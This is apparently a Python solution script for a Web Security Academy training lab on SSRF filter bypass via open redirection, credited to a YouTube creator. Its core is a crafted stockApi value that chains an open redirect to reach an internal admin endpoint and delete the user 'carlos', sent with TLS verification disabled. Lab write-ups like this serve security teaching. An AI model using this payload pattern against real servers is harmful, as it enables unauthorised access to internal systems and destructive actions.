import sys
import logging
import urllib3

import requests         #  Web Security Academy | SSRF | 4 - SSRF Filter Bypass via Open Redirection

from utils import utils #  Code  copied from YouTube Channel  @tjc_   https://youtu.be/vC0__nLuHR4 

from utils.shop import Shop


log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}][{name}] {message}",
    style="{",
    datefmt="%H:%M:%S",
)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main(args):
    shop = Shop(args.url, args.no_proxy)
    url = shop.base_url + "product/stock"
    log.info("Deleted User Carlos using SSRF Open Redirect vulnerability")
    admin_deleteuser_url = "/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos"
    data = {"stockApi": admin_deleteuser_url}
    if args.no_proxy:
        requests.post(url, data=data)
    else:
        requests.post(url, data=data, proxies=utils.PROXIES, verify=False)
    log.info("SSRF Payload delivered")
    shop.is_solved()


if __name__ == "__main__":            # credit for this python code go to  @tjc_   
    args = utils.parse_args(sys.argv)
    main(args)
